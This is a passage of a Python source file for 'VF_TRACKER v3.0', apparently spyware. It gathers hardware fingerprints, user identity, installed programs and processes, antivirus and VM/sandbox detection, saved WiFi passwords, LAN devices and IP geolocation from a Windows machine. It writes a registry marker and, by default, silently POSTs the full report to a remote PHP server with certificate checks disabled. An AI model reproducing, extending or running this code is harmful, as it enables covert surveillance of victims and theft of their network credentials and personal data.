    Strategy 4: Chossed numbers detection (when lat/lon are concatenated without separator)
    """
    # Search in both context and full page
    search_texts = [context_text, full_text]

    for text in search_texts:
        # ─── Strategy 1: Labeled coordinates ───
        labeled_patterns = [
            # English: Latitude: X, Longitude: Y
            r'(?:Latitude|Lat)\s*[:：]?\s*(\d{2}\.\d+)\s*[°]?\s*.{0,15}?(?:Longitude|Lon|Lng)\s*[:：]?\s*(\d{2,3}\.\d+)',
            # Persian: عرض جغرافیایی: X, طول جغرافیایی: Y
            r'(?:\u0639\u0631\u0636|\u0645\u062e\u062a\u0635\u0627\u062a)\s*[:：]?\s*(\d{2}\.\d+)\s*[°]?\s*.{0,20}?(?:\u0637\u0648\u0644)\s*[:：]?\s*(\d{2,3}\.\d+)',
            # Coordinates label
            r'(?:Coordinates?|\u0645\u062e\u062a\u0635\u0627\u062a|\u0645\u0648\u0642\u0639\u06cc\u062a)\s*[:：]?\s*(\d{2}\.\d+)\s*[°]?\s*[,،\s]\s*(\d{2,3}\.\d+)',
        ]
        for pat in labeled_patterns:
            m = re.search(pat, text, re.IGNORECASE)
            if m:
                return f"{m.group(1)}, {m.group(2)}"

        # ─── Strategy 2: Decimal pair with comma/space separator ───
        # Handles: 35.6892, 51.3890 | 35.6892 51.3890 | 35.6892°, 51.3890°
        pair_patterns = [
            r'(\d{2}\.\d+)\s*[°]?\s*[,،]\s*(\d{2,3}\.\d+)',         # Comma separated
            r'(\d{2}\.\d+)\s*[°]?\s+[NS]\s*[,،]?\s*(\d{2,3}\.\d+)', # N/S, then E/W
        ]
        for pat in pair_patterns:
            m = re.search(pat, text)
            if m:
                return f"{m.group(1)}, {m.group(2)}"

        # ─── Strategy 3: Smart pair detection ───
        # Find ALL decimal numbers, then look for a pair that looks like coordinates
        # For Iran: latitude 25-40, longitude 44-63
        # Global: latitude -90 to 90, longitude -180 to 180
        all_decimals = re.findall(r'(\d{2,3}\.\d{1,6})', text)
        for i in range(len(all_decimals) - 1):
            try:
                val1 = float(all_decimals[i])
                val2 = float(all_decimals[i + 1])
                # Iran-specific range (most common use case)
                if 24 <= val1 <= 42 and 43 <= val2 <= 64:
                    return f"{all_decimals[i]}, {all_decimals[i+1]}"
                # Global range
                if 10 <= val1 <= 70 and 10 <= val2 <= 180 and abs(val2 - val1) > 5:
                    # Make sure they're not just version numbers
                    # Skip if both numbers are very close (likely same field)
                    if abs(val1 - val2) > 3:
                        return f"{all_decimals[i]}, {all_decimals[i+1]}"
            except (ValueError, IndexError):
                pass

    # ─── Strategy 4: Chossed numbers (e.g., "35.689251.3890") ───
    # Sometimes lat and lon are concatenated without any separator
    m = re.search(r'(\d{2})\.(\d{4})(\d{2,3})\.(\d{4})', full_text)
    if m:
        lat_val = f"{m.group(1)}.{m.group(2)}"
        lon_val = f"{m.group(3)}.{m.group(4)}"
        try:
            if 24 <= float(lat_val) <= 42 and 43 <= float(lon_val) <= 64:
                return f"{lat_val}, {lon_val}"
        except ValueError:
            pass

    return "\u0646\u0627\u0645\u0634\u062e\u0635"  # نامشخص


# ═══════════════════════════════════════════════════════════════════════════════
# REPORT BUILDER v3 — Comprehensive Report
# ═══════════════════════════════════════════════════════════════════════════════

def build_report(output_path=None, silent=False):
    """
    Build the full system tracker report with all phases.
    Returns: (output_path, report_text, report_data_dict)
    """
    def log(msg):
        if not silent:
            print(msg)

    if output_path is None:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        output_path = os.path.join(script_dir, "VF_TRACKER_REPORT.txt")

    os.makedirs(os.path.dirname(os.path.abspath(output_path)), exist_ok=True)

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    admin_status = "YES (Admin)" if is_admin() else "NO (Limited)"

    log(f"\n{'='*70}")
    log(f"  VF_TRACKER v3.0 - Collecting system information...")
    log(f"  Time: {timestamp}")
    log(f"{'='*70}\n")

    # ─── Phase 1: Hardware Fingerprint ───
    log("  [1/6] Collecting hardware fingerprint...")
    motherboard = get_motherboard_serial()
    bios_uuid = get_bios_uuid()
    cpu_id = get_cpu_processor_id()
    disk_serial = get_disk_serial()
    gpu_list = get_gpu_info()
    battery = get_battery_info()
    mac_addr = get_mac_address()
    hwid = generate_hwid(motherboard, bios_uuid, cpu_id, disk_serial, mac_addr)
    machine_id = generate_machine_id(hwid)

    # ─── Phase 1.5: OS & Basic ───
    os_info, cpu_info = get_os_info()
    hw_info = get_hardware_resources()
    uptime = get_system_uptime()
    hostname = socket.gethostname()

    # ─── Phase 2: User Identity ───
    log("  [2/6] Collecting user identity...")
    username = get_windows_username()
    fullname = get_user_fullname()
    last_login = get_last_login()
    users_list = get_installed_users()
    domain_wg = get_domain_workgroup()
    tz_locale = get_timezone_locale()
    kb_layout = get_keyboard_layout()

    # ─── Phase 2.5: Environment ───
    log("  [3/6] Detecting environment...")
    programs = get_installed_programs()
    processes = get_running_processes()
    antivirus = get_antivirus_info()
    vm_detection = detect_vm_sandbox()
    vpn_proxy = detect_vpn_proxy()

    # ─── Phase 3: Deep Network ───
    log("  [4/6] Collecting network information...")
    local_ip = get_local_ip()
    gateway = get_default_gateway()
    wifi_ssid, wifi_signal = get_current_wifi_info()
    wifi_profiles = get_all_wifi_profiles()
    dns_servers = get_dns_servers()
    dhcp_server = get_dhcp_server()
    adapters = get_all_network_adapters()
    proxy_settings = get_proxy_settings()
    firewall = get_firewall_status()
    wifi_passwords = get_wifi_passwords()
    connections = get_active_connections()
    arp_devices = get_arp_table()

    # ─── Phase 3.5: Public IP ───
    log("  [5/6] Retrieving public IP & geolocation...")
    pub_ip, isp, country, city, coords = get_info_from_numberia()

    # Parse coordinates for maps link
    maps_link = "N/A"
    if coords and coords not in ("Unknown", "\u0646\u0627\u0645\u0634\u062e\u0635") and ',' in coords:
        try:
            parts = coords.split(',')
            maps_link = generate_maps_link(parts[0].strip(), parts[1].strip())
        except Exception:
            pass

    # ─── Phase 4: Machine ID ───
    log("  [6/6] Registering machine ID...")
    existing_marker, marker_status = check_existing_marker()
    is_new_machine = existing_marker is None
    marker_saved, marker_msg = save_registry_marker(machine_id)

    # ═══ BUILD TXT REPORT ═══
    lines = []
    sep = "=" * 70
    sep2 = "-" * 70

    lines.append(sep)
    lines.append(f"  VF_TRACKER v3.0 REPORT")
    lines.append(f"  Generated    : {timestamp}")
    lines.append(f"  Admin Access  : {admin_status}")
    lines.append(f"  Machine ID    : {machine_id}")
    lines.append(f"  HWID          : {hwid[:32]}...")
    lines.append(f"  Status        : {'NEW MACHINE' if is_new_machine else f'Known (first ID: {existing_marker})'}")
    lines.append(sep)

    # ── Section 1: Hardware Fingerprint ──
    lines.append("")
    lines.append(f"  {'[HARDWARE FINGERPRINT]':^70}")
    lines.append(sep2)
    lines.append(f"  [HW] Motherboard Serial  : {motherboard}")
    lines.append(f"  [HW] BIOS UUID           : {bios_uuid}")
    lines.append(f"  [HW] CPU Processor ID    : {cpu_id}")
    lines.append(f"  [HW] Disk Drive Serial   : {disk_serial}")
    lines.append(f"  [HW] MAC Address         : {mac_addr}")
    lines.append(f"  [HW] Battery             : {battery}")
    if isinstance(gpu_list, list):
        for i, gpu in enumerate(gpu_list):
            lines.append(f"  [HW] GPU #{i+1}              : {gpu}")
    else:
        lines.append(f"  [HW] GPU                 : {gpu_list}")
    lines.append(f"  [HW] HWID (SHA256)       : {hwid}")
    lines.append(f"  [HW] Machine ID          : {machine_id}")
    lines.append(f"  [HW] Registry Marker     : {marker_msg}")

    # ── Section 2: System & OS ──
    lines.append("")
    lines.append(f"  {'[SYSTEM & OS]':^70}")
    lines.append(sep2)
    lines.append(f"  [SYS] Hostname           : {hostname}")
    lines.append(f"  [SYS] Operating System   : {os_info}")
    lines.append(f"  [SYS] Processor          : {cpu_info}")
    lines.append(f"  [SYS] Last Restart       : {uptime}")
    if 'RAM' in hw_info:
        lines.append(f"  [SYS] RAM                : {hw_info['RAM']}")
    if 'Disk C:' in hw_info:
        lines.append(f"  [SYS] Drive C:           : {hw_info['Disk C:']}")

    # ── Section 3: User Identity ──
    lines.append("")
    lines.append(f"  {'[USER IDENTITY]':^70}")
    lines.append(sep2)
    lines.append(f"  [USER] Username          : {username}")
    lines.append(f"  [USER] Full Name         : {fullname}")
    lines.append(f"  [USER] Last Login        : {last_login}")
    lines.append(f"  [USER] Domain/Workgroup  : {domain_wg}")
    lines.append(f"  [USER] Timezone/Locale   : {tz_locale}")
    lines.append(f"  [USER] Keyboard Layout   : {kb_layout}")
    lines.append(f"  [USER] All Users:")
    for u in users_list[:10]:
        if u: lines.append(f"         - {u}")

    # ── Section 4: Environment ──
    lines.append("")
    lines.append(f"  {'[ENVIRONMENT DETECTION]':^70}")
    lines.append(sep2)
    lines.append(f"  [ENV] Antivirus:")
    for av in antivirus:
        if av: lines.append(f"         - {av}")
    lines.append(f"  [ENV] VM/Sandbox Detection:")
    for vm in vm_detection:
        if vm: lines.append(f"         - {vm}")
    lines.append(f"  [ENV] VPN/Proxy Detection:")
    for vp in vpn_proxy:
        if vp: lines.append(f"         - {vp}")
    lines.append(f"  [ENV] Installed Programs ({len(programs)} shown):")
    for prog in programs[:20]:
        if prog: lines.append(f"         - {prog}")
    lines.append(f"  [ENV] Running Processes ({len(processes)} shown):")
    for proc in processes[:15]:
        if proc: lines.append(f"         - {proc}")

    # ── Section 5: Network ──
    lines.append("")
    lines.append(f"  {'[NETWORK - INTERNAL]':^70}")
    lines.append(sep2)
    lines.append(f"  [NET] Local IP           : {local_ip}")
    lines.append(f"  [NET] Gateway            : {gateway}")
    lines.append(f"  [NET] DNS Servers        : {', '.join(dns_servers[:3])}")
    lines.append(f"  [NET] DHCP Server        : {dhcp_server}")
    lines.append(f"  [NET] Network Adapters:")
    for ad in adapters[:5]:
        if ad: lines.append(f"         - {ad}")
    lines.append(f"  [NET] Proxy Settings:")
    for ps in proxy_settings:
        if ps: lines.append(f"         - {ps}")

    # ── Section 6: WiFi ──
    lines.append("")
    lines.append(f"  {'[WIFI INFORMATION]':^70}")
    lines.append(sep2)
    lines.append(f"  [WIFI] Current SSID      : {wifi_ssid}")
    lines.append(f"  [WIFI] Signal Strength   : {wifi_signal}")
    lines.append(f"  [WIFI] Previous Networks ({len(wifi_profiles)} total):")
    for wp in wifi_profiles:
        if wp: lines.append(f"         - {wp}")
    lines.append(f"  [WIFI] Saved Passwords:")
    for name, passw in wifi_passwords:
        lines.append(f"         -> {name:<25} | Pass: {passw}")

    # ── Section 7: Public IP & Location ──
    lines.append("")
    lines.append(f"  {'[PUBLIC IP & GEOLOCATION]':^70}")
    lines.append(sep2)
    if pub_ip and pub_ip not in ("Not found", "\u06cc\u0627\u0641\u062a \u0646\u0634\u062f"):
        lines.append(f"  [NET] Public IP          : {pub_ip}")
        lines.append(f"  [NET] ISP                : {isp}")
        lines.append(f"  [LOC] Country            : {country}")
        lines.append(f"  [LOC] City               : {city}")
        lines.append(f"  [LOC] Coordinates        : {coords}")
        if maps_link != "N/A":
            lines.append(f"  [LOC] Google Maps        : {maps_link}")
    else:
        lines.append(f"  [ERROR] Internet info retrieval failed.")

    # ── Section 8: Security ──
    lines.append("")
    lines.append(f"  {'[SECURITY]':^70}")
    lines.append(sep2)
    lines.append(f"  [SEC] Firewall Status:")
    for f in firewall:
        if f: lines.append(f"         - {f}")
    lines.append(f"  [SEC] Active Connections:")
    for conn in connections:
        if conn: lines.append(f"         -> {conn}")
    lines.append(f"  [SEC] LAN Devices (ARP):")
    for device in arp_devices:
        if device: lines.append(f"         -> {device}")

    lines.append("")
    lines.append(sep)

    report_text = "\n".join(lines)

    # ═══ Write TXT file ═══
    try:
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(report_text)
        log(f"\n  [OK] Report saved to: {output_path}")
    except Exception as e:
        log(f"\n  [ERROR] Failed to save: {e}")
        try:
            desktop = os.path.join(os.path.expanduser("~"), "Desktop")
            fallback = os.path.join(desktop, "VF_TRACKER_REPORT.txt")
            with open(fallback, 'w', encoding='utf-8') as f:
                f.write(report_text)
            log(f"  [OK] Fallback saved to: {fallback}")
            output_path = fallback
        except Exception:
            log(f"  [ERROR] Fallback also failed")

    # ═══ Build JSON data ═══
    report_data = {
        "version": "3.0",
        "timestamp": timestamp,
        "admin": admin_status,
        "is_new_machine": is_new_machine,
        "previous_machine_id": existing_marker,
        # Hardware
        "hwid": hwid,
        "machine_id": machine_id,
        "motherboard_serial": motherboard,
        "bios_uuid": bios_uuid,
        "cpu_processor_id": cpu_id,
        "disk_serial": disk_serial,
        "gpu": gpu_list,
        "battery": battery,
        "mac_address": mac_addr,
        # System
        "hostname": hostname,
        "os": os_info,
        "cpu": cpu_info,
        "uptime": uptime,
        "hardware": hw_info,
        # User
        "username": username,
        "fullname": fullname,
        "last_login": last_login,
        "users": users_list,
        "domain_workgroup": domain_wg,
        "timezone_locale": tz_locale,
        "keyboard_layout": kb_layout,
        # Environment
        "antivirus": antivirus,
        "vm_detection": vm_detection,
        "vpn_proxy": vpn_proxy,
        "installed_programs": programs[:30],
        "running_processes": processes,
        # Network
        "local_ip": local_ip,
        "gateway": gateway,
        "dns_servers": dns_servers,
        "dhcp_server": dhcp_server,
        "network_adapters": adapters,
        "proxy_settings": proxy_settings,
        "wifi_ssid": wifi_ssid,
        "wifi_signal": wifi_signal,
        "wifi_profiles": wifi_profiles,
        "wifi_passwords": [{"name": n, "password": p} for n, p in wifi_passwords],
        # Public
        "public_ip": pub_ip,
        "isp": isp,
        "country": country,
        "city": city,
        "coordinates": coords,
        "maps_link": maps_link,
        # Security
        "firewall": firewall,
        "active_connections": connections,
        "arp_devices": arp_devices,
    }

    # ═══ Save JSON ═══
    json_path = output_path.replace('.txt', '.json')
    try:
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, ensure_ascii=False, indent=2)
        log(f"  [OK] JSON saved to: {json_path}")
    except Exception as e:
        log(f"  [ERROR] JSON save failed: {e}")

    if not silent:
        print(report_text)

    return output_path, report_text, report_data


# ═══════════════════════════════════════════════════════════════════════════════
# SERVER SENDER — POST data to PHP endpoint
# ═══════════════════════════════════════════════════════════════════════════════

def send_to_server(server_url, token, report_text, report_data, silent=False):
    """Send tracker report to remote PHP server via HTTP POST."""
    def log(msg):
        if not silent:
            print(msg)

    try:
        post_data = urllib.parse.urlencode({
            'vf_token': token,
            'tracker_data': report_text,
            'tracker_json': json.dumps(report_data, ensure_ascii=False)
        }).encode('utf-8')

        req = urllib.request.Request(server_url, data=post_data, method='POST')
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        req.add_header('User-Agent', 'STORM_VX_TRACKER/3.0')

        ctx = ssl._create_unverified_context()
        response = urllib.request.urlopen(req, timeout=15, context=ctx)
        response_data = response.read().decode('utf-8')

        try:
            result = json.loads(response_data)
            if result.get('status') == 'ok':
                log(f"  [OK] Report sent to server: {server_url}")
                log(f"       Saved as: {result.get('file', 'unknown')}")
                return True
            else:
                log(f"  [ERROR] Server rejected: {result.get('message', 'Unknown error')}")
                return False
        except json.JSONDecodeError:
            log(f"  [OK] Server received data")
            return True

    except urllib.error.HTTPError as e:
        log(f"  [ERROR] Server HTTP {e.code}: {e.reason}")
        return False
    except urllib.error.URLError as e:
        log(f"  [ERROR] Cannot reach server: {e.reason}")
        return False
    except Exception as e:
        log(f"  [ERROR] Send failed: {e}")
        return False


# ═══════════════════════════════════════════════════════════════════════════════
# CLI ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="VF_TRACKER v3.0 - Advanced System Identity Tracker")
    parser.add_argument("--output", "-o", type=str, default=None,
                        help="Custom output path for TXT report")
    parser.add_argument("--silent", "-s", action="store_true",
                        help="Silent mode - only write to file")
    parser.add_argument("--server", type=str, default=DEFAULT_SERVER_URL,
                        help=f"PHP receiver URL (default: {DEFAULT_SERVER_URL})")
    parser.add_argument("--no-server", action="store_true",
                        help="Skip sending to server (local only)")
    parser.add_argument("--token", type=str, default=VF_SECRET_TOKEN,
                        help="Security token for server authentication")
    args = parser.parse_args()

    result_path, report_text, report_data = build_report(
        output_path=args.output, silent=args.silent
    )

    if not args.no_server and args.server:
        send_to_server(
            server_url=args.server,
            token=args.token,
            report_text=report_text,
            report_data=report_data,
            silent=args.silent
        )
